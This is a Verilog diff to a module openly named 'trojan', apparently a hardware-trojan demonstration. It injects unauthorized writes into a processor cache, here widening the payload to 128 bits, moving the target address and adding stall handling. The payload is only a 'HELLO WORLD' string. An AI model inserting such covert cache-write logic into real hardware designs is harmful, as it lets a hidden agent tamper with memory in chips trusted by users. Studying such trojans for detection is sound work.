@@ -22,7 +22,7 @@ module trojan (
 	
 	// Write to cache
 	output reg			o_troj,
-	output reg [31:0] 	o_troj_write_data,
+	output reg [127:0] 	o_troj_write_data,
 	output reg [31:0]	o_troj_write_addr,
 	output reg [31:0]   o_troj_write_addr_nxt
     );
@@ -46,16 +46,18 @@ module trojan (
 	reg [15:0]	cache_state;
 	reg [15:0]	cache_state_nxt;
 	
-	wire [31:0] troj_data1;
-	wire [31:0]	troj_data2;
-	wire [31:0] troj_data3;
+	wire [127:0] 	troj_data1;
+	wire [127:0]	troj_data2;
+	wire [127:0] 	troj_data3;
 	
 	reg		o_troj_nxt;
 	reg [31:0]	write_data_nxt;
+
+	reg 		stall_reg;
 	
-	assign troj_data1 = 32'h4845_4C4C;		/// "HELL"
-	assign troj_data2 = 32'h4F20_574F;		/// "O WO"
-	assign troj_data3 = 32'h524C_4400;		/// "RLD\0"
+	assign troj_data1 = 128'h00000000000000000000000048454C4C;		/// "HELL"
+	assign troj_data2 = 128'h0000000000000000000000004F20574F;		/// "O WO"
+	assign troj_data3 = 128'h000000000000000000000000524C4400;		/// "RLD\0"
 	
 	//assign o_troj_write_addr 		= 32'h3E00_0000;
 	//assign o_troj_write_addr_nxt 	= 32'h3E00_0020;
@@ -65,24 +67,33 @@ module trojan (
 			o_troj 			<= 1'b1;
 			cache_state 		<= 16'b0;
 			o_troj_write_data 	<= troj_data1;
-			o_troj_write_addr	<= 32'h0020_0000;
-			$display("Setting data to %h", o_troj_write_data);
-			$display("Setting addr to %h", o_troj_write_addr);	
+			o_troj_write_addr	<= 32'h0020_E900;		/// Line 233
+			stall_reg		<= 1'b0;
+			// $display("Setting data to %h", o_troj_write_data);
+			// $display("Setting addr to %h", o_troj_write_addr);	
 		end
 		else if (!i_cache_stall) begin
-			$display("Setting data to %h", o_troj_write_data);
-			$display("Setting addr to %h", o_troj_write_addr);
-			o_troj			<= o_troj_nxt;
-			cache_state		<= cache_state_nxt;
-			o_troj_write_data	<= write_data_nxt;
-			o_troj_write_addr	<= o_troj_write_addr_nxt;
+			// $display("Setting data to %h", o_troj_write_data);
+			// $display("Setting addr to %h", o_troj_write_addr);
+			if (!stall_reg) begin
+				o_troj			<= o_troj_nxt;
+				cache_state		<= cache_state_nxt;
+				o_troj_write_data	<= write_data_nxt;
+				o_troj_write_addr	<= o_troj_write_addr_nxt;
+			end else begin
+				o_troj			<= o_troj;
+				cache_state		<= cache_state;
+				o_troj_write_data	<= o_troj_write_data;
+				o_troj_write_addr	<= o_troj_write_addr;
+				stall_reg		<= 1'b0;
+			end
 		end
 		else begin
-			$display("Cache stall!");
 			o_troj			<= 1'b0;
 			cache_state		<= cache_state;
 			o_troj_write_data	<= o_troj_write_data;
 			o_troj_write_addr	<= o_troj_write_addr;
+			stall_reg 		<= 1'b1;
 		end
 	end
 	
@@ -102,7 +113,7 @@ module trojan (
 		else
 			write_data_nxt = troj_data1;
 			
-		o_troj_write_addr_nxt = o_troj_write_addr + 8'h04;
+		o_troj_write_addr_nxt = o_troj_write_addr + 8'h10;
 	end
     
     always @(*) begin
